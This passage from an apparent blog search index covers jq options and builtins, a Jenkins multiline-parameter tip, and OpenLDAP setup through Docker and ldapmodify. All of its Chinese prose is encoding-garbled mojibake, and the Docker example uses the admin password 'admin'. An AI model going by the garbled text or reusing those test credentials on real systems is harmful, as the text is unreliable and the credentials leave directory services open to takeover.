20:23","objectID":"/post/jq%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/:0:0","tags":["jq","json"],"title":"Jqå‘½ä»¤ä½¿ç”¨è¯¦è§£","uri":"/post/jq%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"å‚æ•°ä»‹ç» --stream: å¤„ç†å¤§é‡æ•°æ®çš„æ—¶å€™ä½¿ç”¨ --slurp/ -s: å½“è¾“å…¥å†…å®¹æ˜¯å¤šä¸ªjsonå¯¹è±¡æ—¶ï¼Œå°†å¤šä¸ªjsonå¯¹è±¡è§†ä¸º1ä¸ªjsonæ•°ç»„ã€‚è¿™æ ·å°±å¯ä»¥ç”¨ä¸€ä¸ªjqè¿‡æ»¤å™¨æ¥å¤„ç†æ‰€æœ‰çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯æ¯ä¸ªJSONå€¼éƒ½è¦å¤„ç†ä¸€æ¬¡ã€‚æ¯”å¦‚ {\"name\": \"test1\"} {\"name\": \"test2\"} #jq -sä¼šå°†ä¸Šé¢çš„å†…å®¹å¤„ç†æˆä¸‹é¢è¿™æ ·############### [ {\"name\": \"test1\"}, {\"name\": \"test2\"} ] --raw-input/ -R: ä¸è¦å°†è¾“å…¥è§£æä¸º JSONã€‚ç›¸åï¼Œæ¯ä¸€è¡Œæ–‡æœ¬éƒ½ä½œä¸ºå­—ç¬¦ä¸²ä¼ é€’ç»™è¿‡æ»¤å™¨ã€‚å¦‚æœä¸ --slurp ç»“åˆä½¿ç”¨ï¼Œåˆ™æ•´ä¸ªè¾“å…¥å°†ä½œä¸ºå•ä¸ªé•¿å­—ç¬¦ä¸²ä¼ é€’ç»™è¿‡æ»¤å™¨ã€‚ ä¾‹å¦‚å°†å¤§å†™å­—æ¯è½¬æ¢ä¸ºå°å†™å­—æ¯: echo -e \"ONE\\nTWO\\nTHREE\" | jq -R ascii_downcase --null-input/ -n: ä¸è¯»å–ä»»ä½•å†…å®¹, ä½¿ç”¨jqæ„é€ æ•°æ®æ—¶å¯ä»¥ä½¿ç”¨ï¼Œä¾‹å¦‚jq -n 1+1 --compact-output/ -c: ç´§å‡‘çš„æ‰“å°è¾“å‡ºå†…å®¹ --tab: ç¼©è¿›ä½¿ç”¨åˆ¶è¡¨ç¬¦è€Œä¸æ˜¯ä¸¤ä¸ªç©ºæ ¼ --indent n: ä½¿ç”¨æŒ‡å®šçš„ç©ºæ ¼ä½œä¸ºé”ç´§, èŒƒå›´-1åˆ°7 --color-output/-C: å¼ºåˆ¶é«˜äº®æ˜¾ç¤º,é»˜è®¤åªåœ¨ç»ˆç«¯è¾“å‡ºæ‰ä¼šé«˜äº®æ˜¾ç¤º,ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­: echo '{\"name\": 1}' | jq | cat # ä¸ä¼šé«˜äº®æ˜¾ç¤º echo '{\"name\": 1}' | jq -C | cat # é«˜äº®æ˜¾ç¤º --monochrome-output/ -M: å¼ºåˆ¶ä¸è¾“å‡ºé¢œè‰²ï¼Œå³ä½¿ä½¿ç”¨äº†-Cä¹Ÿä¸ä¼šè¾“å‡ºé¢œè‰² --ascii-output/ -a: å°†ASCIIç ä¹‹å¤–çš„Unicodeç¬¦å·æ˜¾ç¤ºä¸ºè½¬ä¹‰çš„å½¢å¼ï¼Œé»˜è®¤æ˜¯ä¼šå°†Unicodeç¬¦å·æŒ‰ç…§UTF8è¾“å‡º [root@mytest ~]# echo '{\"name\": \"SoulChild\\u968f\\u7b14\\u8bb0\"}' | jq -a { \"name\": \"SoulChild\\u968f\\u7b14\\u8bb0\" } [root@mytest ~]# echo '{\"name\": \"SoulChild\\u968f\\u7b14\\u8bb0\"}' | jq { \"name\": \"SoulChildéšç¬”è®°\" } --unbuffered: ä¸ä½¿ç”¨ç¼“å†²åŒº,å®æ—¶è¾“å‡ºå¤„ç†ç»“æœ, åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œjqåœ¨å¤„ç†å®Œæ‰€æœ‰è¾“å…¥æ•°æ®åæ‰å°†å…¶è¾“å‡ºï¼Œä»¥ä¾¿è¿›è¡Œå¿…è¦çš„æ’åºå’Œæ ¼å¼åŒ–ã€‚ --sort-keys/ -S: æŒ‰ç…§keyå‡åºè¾“å‡º,æ›´é«˜çº§çš„æ’åºå¯ä»¥ä½¿ç”¨sortå’Œsort_by,é…åˆreverseåè½¬ [root@mytest ~]# echo '{\"name\": \"SoulChild\", \"age\": \"10\"}' | jq { \"name\": \"SoulChild\", \"age\": \"10\" } [root@mytest ~]# echo '{\"name\": \"SoulChild\", \"age\": \"10\"}' | jq -S { \"age\": \"10\", \"name\": \"SoulChild\" } --raw-output/ -r: è·å–çš„ç»“æœå¦‚æœæ˜¯å­—ç¬¦ä¸²,å»æ‰å­—ç¬¦ä¸²ä¸­çš„å¼•å· --join-output/ -j: ç±»ä¼¼äº-rï¼Œä½†ä¸ä¼šåœ¨æœ€åæ‰“å°æ¢è¡Œç¬¦ã€‚ -f filename/ --from-file filename: ä»æ–‡ä»¶è¯»å–è¿‡æ»¤å™¨ï¼Œè€Œä¸æ˜¯ä»å‘½ä»¤è¡Œè¯»å–ï¼Œæ¯”å¦‚awkçš„-fé€‰é¡¹ã€‚ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨\"#â€œæ¥åšæ³¨é‡Šã€‚ -Ldirectory/ -L directory: å¤æ‚çš„jqè„šæœ¬å¯èƒ½ä¾èµ–å…¶ä»–çš„jqè„šæœ¬,è¿™ç§æƒ…å†µä¸‹å¯ä»¥è®¾ç½®jqè„šæœ¬æ–‡ä»¶çš„æœç´¢è·¯å¾„ -e/ --exit-status: æ ¹æ®è·å–åˆ°çš„ç»“æœå†³å®šé€€å‡ºç æ˜¯å¤šå°‘ # è¾“å‡ºå€¼æ—¢ä¸æ˜¯ false ä¹Ÿä¸æ˜¯ nullï¼Œé€€å‡ºçŠ¶æ€ç ä¸º 0 [root@mytest ~]# echo '{\"foo\": false}' | jq -e . ;echo $? { \"foo\": false } 0 # è¾“å‡ºå€¼æ˜¯ false æˆ– nullï¼Œåˆ™è®¾ç½®ä¸º 1 [root@mytest ~]# echo '{\"foo\": false}' | jq -e .foo ;echo $? false 1 # å‡ºç°ä»»ä½•ä½¿ç”¨é—®é¢˜æˆ–ç³»ç»Ÿé”™è¯¯ï¼Œjq å°†ä»¥ 2 é€€å‡º [root@mytest ~]# jq '.' aa;echo $? jq: error: Could not open file aa: No such file or directory 2 # å¦‚æœå­˜åœ¨ jq ç¨‹åºç¼–è¯‘é”™è¯¯(è¯­æ³•é”™è¯¯)ï¼Œåˆ™è¿”å› 3 [root@mytest ~]# echo '{\"foo\": false}' | jq -e xxx ;echo $? jq: error: xxx/0 is not defined at \u003ctop-level\u003e, line 1: xxx jq: 1 compile error 3 # éæœ‰æ•ˆæ•°æ®ï¼Œåˆ™è®¾ç½®ä¸º 4ã€‚ [root@mytest ~]# echo '{\"foo\": false' | jq '.hello';echo $? parse error: Unfinished JSON term at EOF at line 2, column 0 4 å†…ç½®å‡½æ•°`halt_error`ä¹Ÿå¯ä»¥ä¿®æ”¹exit codeã€‚ --arg name value: å˜é‡ä¼ é€’,ä¾‹å¦‚ # ä¼ é€’ä¸¤ä¸ªå˜é‡nameå’Œname2 # .hello as $greetingå°†è·å–çš„ç»“æœèµ‹å€¼ç»™$greetingå˜é‡ [root@mytest ~]# echo '{\"hello\": \"world\"}' | jq --arg name \"John Doe\" --arg name2 \"SoulChild\" '.hello as $greeting | $greeting + \", \" + $name + \", \" + $name2' \"world, John Doe, SoulChild\" # ä¿®æ”¹åŸå†…å®¹ [root@mytest ~]# echo '{\"name\": \"xxx\"}' | jq --arg newName \"SoulChild\" '.name = $newName' { \"name\": \"SoulChild\" } --argjson name JSON-text: å˜é‡ä¼ é€’,å€¼æ˜¯jsonå¯¹è±¡ [root@mytest ~]# echo '{\"name\": \"xxx\"}' | jq --argjson data '{\"book\": \"hello\", \"name\": \"SoulChild\", \"age\": 10}' '.book=$data.book | .name=$data.name | .age=$data.age' { \"name\": \"SoulChild\", \"book\": \"hello\", \"age\": 10 } --slurpfile variable-name filename: è¯»å–æ•´ä¸ªæ–‡ä»¶å¹¶å°†å…¶å†…å®¹ä½œä¸ºä¸€ä¸ªæ•°ç»„å­˜å‚¨åœ¨æŒ‡å®šçš„å˜é‡ä¸­ã€‚(æ–‡ä»¶æ ¼å¼æ˜¯json) [root@mytest ~]# cat test.json [ {\"name1\": \"a\"}, {\"name2\": \"b\"} ] # æŸ¥çœ‹è¯»å…¥åçš„å†…å®¹ [root@mytest ~]# echo '{\"age\": 1}' | jq --slurpfile content test.json '$content' [ [ { \"name1\": \"a\" }, { \"name2\": \"b\" } ] ] --rawfile variable-name filename: è¯»å–æ•´ä¸ªæ–‡ä»¶å¹¶å°†å…¶å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²å­˜å‚¨åœ¨æŒ‡å®šçš„å˜é‡ä¸­ã€‚(å­—ç¬¦ä¸²æ¯”è¾ƒå¤æ‚æ—¶å¯ä»¥ç”¨è¿™ä¸ªå‚æ•°,æŠŠå®ƒå­˜å…¥æ–‡ä»¶ä¸­å†è¯»å–) [root@mytest ~]# cat test.json [ {\"name1\": \"a\"}, {\"name2\": \"b\"} ] [root@mytest ~]# echo '{\"age\": 1}' | jq --rawfile content test.json '$content' \"[\\n {\\\"name1\\\": \\\"a\\\"},\\n {\\\"name2\\\": \\\"b\\\"}\\n]\\n\" --argfile variable-name filename: å°†æ–‡ä»¶å†…å®¹ä½œä¸ºä¸€ä¸ªå˜é‡ä¼ ç»™æŒ‡å®šçš„å˜é‡ã€‚(æ–‡ä»¶æ ¼å¼æ˜¯json) [root@mytest ~]# cat test.json [ {\"name1\": \"a\"}, {\"name2\": \"b\"} ] [root@mytest ~]# echo '{\"age\": 1}' | jq --argfile content test.json '$content' [ { \"name1\": \"a\" }, { \"name2\": \"b\" } ] --args: å°†å‘½ä»¤è¡Œçš„ä½ç½®å‚æ•°ä½œä¸ºæ•°ç»„ä¼ å…¥(ä¼ å…¥å†…å®¹è¢«è¯†åˆ«ä¸ºå­—ç¬¦ä¸²) # è¿™é‡Œçš„argsæ˜¯\"John Doe\" 30ï¼Œå°±åƒshellä¸­çš„$1,$2 # åœ¨jqä¸­é€šè¿‡$ARGS.positional[0]è·å–ç¬¬ä¸€ä¸ªå˜é‡ [root@mytest ~]# echo '{ \"name\": \"\", \"age\": \"\" }' | jq --args '.name=$ARGS.positional[0] | .age=$ARGS.positional[1]' \"John Doe\" 30 { \"name\": \"John Doe\", \"age\": \"30","date":"2023-02-13 20:23","objectID":"/post/jq%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/:0:1","tags":["jq","json"],"title":"Jqå‘½ä»¤ä½¿ç”¨è¯¦è§£","uri":"/post/jq%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"å†…ç½®å‡½æ•° å†…å®¹è¾ƒå¤šï¼Œå®˜æ–¹æ–‡æ¡£: https://stedolan.github.io/jq/manual/v1.6/#Builtinoperatorsandfunctions è¿ç®—ç¬¦+,-,*,/,%,\u003e,\u003c,== [root@mytest ~]# echo '{\"age\": 10}' | jq '.age + 2' 12 [root@mytest ~]# echo '{\"age\": 10}' | jq '.age \u003e 2' true [root@mytest ~]# jq -n '\"x\" * 10' \"xxxxxxxxxx\" .... lengthè®¡ç®—é•¿åº¦ [root@mytest ~]# jq -n '\"x\" * 10 | length' 10 [root@mytest ~]# echo '[1,2,3,4,5]' | jq 'length' 5 keysã€keys_unsortedè·å–å¯¹è±¡çš„key # é»˜è®¤ä¼šå¯¹keyæŒ‰ç…§Unicodeç ç‚¹æ’åº [root@mytest ~]# echo '{\"abc\": 1, \"abcd\": 2, \"Foo\": 3}' | jq 'keys' [ \"Foo\", \"abc\", \"abcd\" ] # ä¸æ’åº [root@mytest ~]# echo '{\"abc\": 1, \"abcd\": 2, \"Foo\": 3}' | jq 'keys_unsorted' [ \"abc\", \"abcd\", \"Foo\" ] map(x), map_values(x) map(x) éå†æ¯ä¸ªå…ƒç´ ï¼Œæ‹¿åˆ°valueï¼Œå¹¶å¯¹valueæ‰§è¡Œxæ“ä½œ, è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚æ“ä½œæ•°ç»„ä¸€èˆ¬ç”¨è¿™ä¸ª map_values(x) éå†mapå¯¹è±¡å…ƒç´ ï¼Œæ‹¿åˆ°valueï¼Œå¹¶å¯¹valueæ‰§è¡Œxæ“ä½œ, è¿”å›ä¸€ä¸ªå¯¹è±¡,ä¿æŒåŸæ¥çš„keyä¸å˜ã€‚æ“ä½œå¯¹è±¡ä¸€èˆ¬ç”¨è¿™ä¸ª [root@mytest ~]# echo '[1,2,3]' | jq 'map(. + 1)' [ 2, 3, 4 ] [root@mytest ~]# echo '{\"a\": 1, \"b\": 2, \"c\": 3}' | jq 'map_values(. + 1)' { \"a\": 2, \"b\": 3, \"c\": 4 } has(key) keyæˆ–è€…æŒ‡å®šä½ç½®çš„å…ƒç´ æ˜¯å¦å­˜åœ¨ # å…ˆç”¨mapéå†åˆ—è¡¨ä¸­çš„å…ƒç´ ,å¯¹æ¯ä¸ªå…ƒç´ ä½¿ç”¨has(\"foo\"), åˆ¤æ–­fooè¿™ä¸ªkeyæ˜¯å¦å­˜åœ¨ [root@mytest ~]# echo '[{\"foo\": 42}, {}]' | jq 'map(has(\"foo\"))' [ true, false ] # å…ˆç”¨mapéå†åˆ—è¡¨ä¸­çš„å…ƒç´ ,å¯¹æ¯ä¸ªå…ƒç´ ä½¿ç”¨has(2), åˆ¤æ–­ä¸‹æ ‡ä¸º2çš„ä½ç½®æœ‰æ²¡æœ‰å…ƒç´  [root@mytest ~]# echo '[[0,1], [\"a\",\"b\",\"c\"]]' | jq 'map(has(2))' [ false, true ] tostring è½¬æ¢ä¸ºå­—ç¬¦ä¸² ","date":"2023-02-13 20:23","objectID":"/post/jq%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/:0:2","tags":["jq","json"],"title":"Jqå‘½ä»¤ä½¿ç”¨è¯¦è§£","uri":"/post/jq%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":"ä¾‹å­ è·å–å¯¹è±¡ # ç›´æ¥é€šè¿‡.è·å– echo '{\"a/\": \"aaa\"}' | jq '.\"a/\"' # ä¹Ÿæ”¯æŒç±»ä¼¼pythonå­—å…¸çš„ç”¨æ³• echo '{\"a/\": \"aaa\"}' | jq '.[\"a/\"]' åˆ—è¡¨æ“ä½œ # é€šè¿‡ä¸‹æ ‡è·å–å…ƒç´  echo '[1,2,3,4,5]' | jq .[0] # åˆ‡ç‰‡ echo '[1,2,3,4,5]' | jq .[0:-1] # è·å–åˆ—è¡¨æ‰€æœ‰å…ƒç´  echo '[1,2,3,4,5]' | jq .[] # å¿½ç•¥é”™è¯¯ echo '1' | jq '.[]?' # è·å–æ‰€æœ‰å…ƒç´ çš„æŸä¸ªå±æ€§ echo '[{\"name\": \"a\"},{\"name\": \"b\"},{\"name\": \"c\"}]' | jq .[].name æˆ–æ“ä½œ # è¾“å‡ºname1æˆ–è€…name2å­—æ®µ echo '{\"name1\": \"a\"}{\"name2\": \"b\"}' | jq '.name1 // .name2' è¾“å‡ºå¤šä¸ªå­—æ®µ echo '{\"foo\": 42, \"bar\": \"something else\", \"baz\": true}' | jq '.foo, .bar' ","date":"2023-02-13 20:23","objectID":"/post/jq%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/:0:3","tags":["jq","json"],"title":"Jqå‘½ä»¤ä½¿ç”¨è¯¦è§£","uri":"/post/jq%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"},{"categories":["devops"],"content":"åœ¨ä½¿ç”¨jenkinså‚æ•°åŒ–æ„å»ºçš„æ–‡æœ¬å‚æ•°æ—¶, å¦‚æœå†…å®¹åŒ…å«æ¢è¡Œ, æ¯”å¦‚ image.png.png ä½¿ç”¨echo \"$SCRIPT\"è¾“å‡ºå†…å®¹ä¼šå‘ç°ç»“æœæ˜¯: #!/bin/bash date echo test ä½¿ç”¨printfå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜: printf \"$SCRIPT\" ","date":"2023-02-09 13:30","objectID":"/post/jenkins%E6%96%87%E6%9C%AC%E5%8F%82%E6%95%B0%E6%97%A0%E6%B3%95%E8%8E%B7%E5%8F%96%E6%8D%A2%E8%A1%8C%E9%97%AE%E9%A2%98/:0:0","tags":["jenkins"],"title":"Jenkinsæ–‡æœ¬å‚æ•°æ— æ³•è·å–æ¢è¡Œé—®é¢˜","uri":"/post/jenkins%E6%96%87%E6%9C%AC%E5%8F%82%E6%95%B0%E6%97%A0%E6%B3%95%E8%8E%B7%E5%8F%96%E6%8D%A2%E8%A1%8C%E9%97%AE%E9%A2%98/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"openldapæœåŠ¡ç«¯ docker run \\ --publish 389:389 \\ --publish 636:636 \\ --name ldap-service \\ --hostname ldap-service \\ --env LDAP_ORGANISATION=\"SoulChild Blog\" \\ --env LDAP_DOMAIN=\"soulchild.cn\" \\ --env LDAP_ADMIN_PASSWORD=\"admin\" \\ --volume /data/slapd/database:/var/lib/ldap \\ --volume /data/slapd/config:/etc/ldap/slapd.d \\ --detach osixia/openldap:1.5.0 phpldapadmin docker run \\ --publish 443:443 \\ --name phpldapadmin-service \\ --hostname phpldapadmin-service \\ --link ldap-service:ldap-host \\ --env PHPLDAPADMIN_LDAP_HOSTS=ldap-host \\ --detach osixia/phpldapadmin:0.9.0 ç™»å½•ä¿¡æ¯ DN: cn=admin,dc=soulchild,dc=cn Password: admin ","date":"2023-02-01 12:32","objectID":"/post/%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2openldap%E6%B5%8B%E8%AF%95/:0:0","tags":["openldap"],"title":"å¿«é€Ÿéƒ¨ç½²openldapæµ‹è¯•","uri":"/post/%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2openldap%E6%B5%8B%E8%AF%95/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å‚è€ƒ https://www.golinuxcloud.com/ldap-tutorial-for-beginners-configure-linux/ https://www.golinuxcloud.com/install-and-configure-openldap-centos-7-linux/ https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/openldap ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:1:0","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å¸¸è§æœ¯è¯­ Entry or object(æ¡ç›®æˆ–å¯¹è±¡) - LDAPä¸­çš„åŸºæœ¬å•å…ƒã€‚æ¯ä¸ªæ¡ç›®éƒ½ç”±ä¸“æœ‰åç§° (DN) é™å®šã€‚è¿™æ˜¯ä¸€ä¸ªä¾‹å­ï¼šdn: uid=yyang,ou=sales,dc=example,dc=com Attributes - å±æ€§æ˜¯ä¸æ¡ç›®å…³è”çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç»„ç»‡æœ‰åœ°å€å±æ€§æˆ–å‘˜å·¥æœ‰ç”µè¯å·ç å±æ€§ã€‚ objectClass - è¿™æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„å±æ€§ã€‚LDAP ä¸­çš„æ‰€æœ‰å¯¹è±¡éƒ½å¿…é¡»æœ‰ä¸€ä¸ªobjectClasså±æ€§ã€‚è¯¥objectClasså®šä¹‰æŒ‡å®šæ¯ä¸ª LDAP å¯¹è±¡éœ€è¦å“ªäº›å±æ€§ï¼Œå¹¶æŒ‡å®šæ¡ç›®çš„å¯¹è±¡ç±»ã€‚æ­¤å±æ€§çš„å€¼å¯ä»¥ç”±å®¢æˆ·ç«¯ä¿®æ”¹ï¼Œä½†objectClassä¸èƒ½åˆ é™¤å±æ€§æœ¬èº«ã€‚ objectClassæ˜¯å®šä¹‰åœ¨schemaæ–‡ä»¶ä¸­çš„ Schema - åˆ—å‡ºäº†æ¯ä¸ªå¯¹è±¡ç±»å‹çš„å±æ€§ï¼Œä»¥åŠè¿™äº›å±æ€§æ˜¯å¿…éœ€çš„è¿˜æ˜¯å¯é€‰çš„ã€‚ä¸‹é¢æ˜¯ä¸€äº›schemaç¤ºä¾‹,å¯ä»¥åœ¨/etc/openldap/schema/ä¸­æ‰¾åˆ°ã€‚ core.schema - å®šä¹‰åŸºæœ¬çš„ LDAPv3 å±æ€§å’Œå¯¹è±¡ã€‚å®ƒæ˜¯ OpenLDAP å®ç°ä¸­å¿…éœ€çš„æ ¸å¿ƒschemaã€‚ inetorgperson.schema - å®šä¹‰ inetOrgPerson å¯¹è±¡ç±»åŠå…¶ç›¸å…³å±æ€§ã€‚è¯¥å¯¹è±¡é€šå¸¸ç”¨äºå­˜å‚¨äººä»¬çš„è”ç³»ä¿¡æ¯ã€‚ LDIF - å®ƒæ˜¯ LDAP æ•°æ®äº¤æ¢æ ¼å¼ã€‚ç”¨äºå‘ LDAP æœåŠ¡å™¨å¯¼å…¥æˆ–å¯¼å‡ºæ•°æ®çš„æ–‡ä»¶åº”é‡‡ç”¨è¿™ç§æ ¼å¼ã€‚ç”¨äºåœ¨ LDAP æœåŠ¡å™¨ä¹‹é—´è¿›è¡Œå¤åˆ¶çš„æ•°æ®ä¹Ÿæ˜¯è¿™ç§æ ¼å¼ã€‚ æœåŠ¡å™¨ç«¯ç”±ä¸¤ä¸ªä¸»è¦å®ˆæŠ¤è¿›ç¨‹ç»„æˆï¼š slapdï¼šè¿™æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ LDAP å®ˆæŠ¤è¿›ç¨‹ï¼Œå®ƒä¾¦å¬æ¥è‡ªå®¢æˆ·ç«¯çš„ LDAP è¿æ¥å¹¶å“åº”å®ƒé€šè¿‡è¿™äº›è¿æ¥æ¥æ”¶åˆ°çš„ LDAP æ“ä½œã€‚ slurpdï¼šè¿™æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ LDAP replication å®ˆæŠ¤è¿›ç¨‹ï¼Œç”¨äºå°†æ›´æ”¹ä»ä¸€ä¸ª slapd æ•°æ®åº“ä¼ æ’­åˆ°å¦ä¸€ä¸ªæ•°æ®åº“ã€‚åªæœ‰åœ¨ä½¿ç”¨å¤šä¸ª LDAP æœåŠ¡å™¨æ—¶æ‰éœ€è¦å®ƒã€‚ ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:2:0","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸€ã€å®‰è£…openldap [root@mytest]# yum install -y openldap openldap-servers openldap-clients openldap-devel compat-openldap openldap-devel compat-openldapå¯é€‰ ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:3:0","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äºŒã€åŸºæœ¬é…ç½® è€ç‰ˆæœ¬ä¸­ /etc/openldap/slapd.d/slapd.conf ä¿å­˜äº† OpenLDAP æœåŠ¡å™¨çš„é…ç½®ã€‚ä½†ç°åœ¨é…ç½®ä¿å­˜åœ¨ LDAP æ•°æ®åº“æœ¬èº«ä¸­ã€‚æ‰€ä»¥åç»­ä½¿ç”¨ldifçš„æ–¹å¼æ¥æ“ä½œæ•°æ® ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:4:0","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1. ä¿®æ”¹é»˜è®¤é…ç½® é»˜è®¤é…ç½®åœ¨/etc/openldap/slapd.d/cn\\=config/olcDatabase\\=\\{2\\}hdb.ldifæ–‡ä»¶ä¸­æŸ¥çœ‹ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤ldapsearch -Y EXTERNAL -H ldapi:/// -b cn=config olcDatabase=\\*ã€‚ æˆ‘ä»¬æ–°å»ºä¸€ä¸ªldifæ–‡ä»¶é…åˆldapmodifyå‘½ä»¤å®Œæˆå¯¹ä»–çš„ä¿®æ”¹ [root@mytest myldif]# cat \u003e\u003e my_config.ldif \u003c\u003cEOF dn: olcDatabase={2}hdb,cn=config changetype: modify replace: olcSuffix olcSuffix: dc=soulchild,dc=cn dn: olcDatabase={2}hdb,cn=config changetype: modify replace: olcRootDN olcRootDN: cn=admin,dc=soulchild,dc=cn EOF dnä»£è¡¨å”¯ä¸€æ ‡è¯†ï¼Œæˆ‘ä»¬ç”¨å®ƒæ¥ç¡®å®šä¿®æ”¹å“ªä¸ªæ•°æ®åº“ changetypeä»£è¡¨ä¿®æ”¹æ“ä½œ replaceä»£è¡¨æ›¿æ¢æŸä¸ªæ¡ç›® olcSuffix: xxx æ˜¯ä¿®æ”¹åçš„å€¼ æ‰§è¡Œldapmodifyä¿®æ”¹ [root@mytest myldif]# ldapmodify -Y EXTERNAL -H ldapi:/// -f my_config.ldif SASL/EXTERNAL authentication started SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth SASL SSF: 0 modifying entry \"olcDatabase={2}hdb,cn=config\" modifying entry \"olcDatabase={2}hdb,cn=config\" ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:4:1","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"2. è®¾ç½®ç®¡ç†å‘˜å¯†ç  [root@mytest myldif]# slappasswd New password: Re-enter new password: {SSHA}sBE7mBD5dfzk/wpQVBjUQMHOD74BegDd [root@mytest myldif]# cat \u003e\u003e adminPass.ldif \u003c\u003cEOF dn: olcDatabase={2}hdb,cn=config changeType: modify add: olcRootPW olcRootPW: {SSHA}sBE7mBD5dfzk/wpQVBjUQMHOD74BegDd EOF [root@mytest myldif]# ldapmodify -Y EXTERNAL -H ldapi:/// -f adminPass.ldif SASL/EXTERNAL authentication started SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth SASL SSF: 0 modifying entry \"olcDatabase={2}hdb,cn=config\" ","date":"2023-01-31 00:38","objectID":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/:4:2","tags":["openldap"],"title":"Openldap2.44å®‰è£…å’Œé…ç½®è¯¦è§£(ä¸€)","uri":"/post/openldap2.44%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%80/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"3. å…è®¸ç®¡ç†å‘˜è®¿é—® [root@mytest myldif]# cat \u003e\u003e adminAccess.ldif \u003c\u003cEOF dn: olcDatabase={1}monitor,cn=config changetype: modify replace: olcAccess olcAccess: {0}to * by dn.base=\"gidNumber=0+uidNumber=0,cn=peercred,cn=external, cn=auth\" read by dn.base=\"cn=admin,dc=soulchild,dc=cn\" read by * none EOF [root@mytest myldif]# ldapmodify -Y EXTERNAL -H ldapi:/// -f adminAccess.ldif SASL/EXTERNAL authentication started SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth SASL SSF: 0 modifying entry \"olcDatabase={1}monitor,cn=config\" ","date":"2023-01-31 